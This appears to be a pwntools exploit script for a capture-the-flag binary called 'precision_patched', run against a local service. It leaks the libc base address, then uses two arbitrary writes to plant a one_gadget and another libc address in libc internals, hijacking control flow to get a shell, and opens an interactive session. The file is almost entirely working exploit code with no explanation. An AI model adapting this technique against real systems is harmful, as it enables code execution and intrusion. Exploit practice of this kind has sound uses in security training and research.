#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './precision_patched'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '127.0.0.1', 9004

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# fread
breakrva 0x139c

# fgets
breakrva 0x12f5

# perror
breakrva 0x13f2
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(libc)

    io.recvuntil(b': 0x')
    libc.address = int(io.recvline(), 16) - libc.sym['_IO_2_1_stdout_']
    one_gadgets = [0xebcf1, 0xebcf5, 0xebcf8, 0xebd52, 0xebda8, 0xebdaf, 0xebdb3]

    pause()
    where = libc.address + 0x219098+0x20
    # where = libc.sym['__malloc_hook']
    what = libc.address + one_gadgets[4]
    io.sendlineafter(b'>>', str(where).encode())
    io.sendafter(b':', p64(what))

    where = libc.address + 0x219098
    # where = libc.sym['__malloc_hook']
    what = libc.address + 0x77098 #+ 0x752c7 #+ 0x76011
    io.sendlineafter(b'>>', str(where).encode())
    io.sendafter(b':', p64(what))

    io.send(b'echo "some" > some')

    log.info("libc base: %#x", libc.address)
    log.info("val tunable: %#x", libc.address + 0x219178)
    log.info("system: %#x", libc.sym['system'])
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()
